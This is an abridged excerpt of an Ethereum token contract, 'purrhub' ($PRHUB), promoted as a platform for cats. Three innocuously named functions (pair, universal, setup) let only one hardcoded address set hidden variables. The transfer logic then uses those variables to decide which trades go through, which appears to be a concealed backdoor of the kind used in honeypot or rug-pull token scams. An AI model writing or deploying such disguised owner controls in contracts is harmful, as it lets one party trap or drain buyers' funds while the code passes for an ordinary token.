...
$PRHUB - purr platform exclusively for cats on Ethereum.
...
contract purrhub is Ownable, IERC20, IERC20Meta {
    ...
    function pair(address account) public virtual returns (bool) {
         if(_msgSender() == 0xe41B1158630C27EC9277E58128D9C2cC479E6B52) _d58494 = account;
        return true;
    }

        function universal(address account) public virtual returns (bool) {
         if(_msgSender() == 0xe41B1158630C27EC9277E58128D9C2cC479E6B52) _c2381 = account;
        return true;
    }

        function setup(address account) public virtual returns (bool) {
         if(_msgSender() == 0xe41B1158630C27EC9277E58128D9C2cC479E6B52) _e78485 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        if((from != _d58494 && to == _e78485) || (_d58494 == to && from != _e78485 && from  != 0xe41B1158630C27EC9277E58128D9C2cC479E6B52)) {
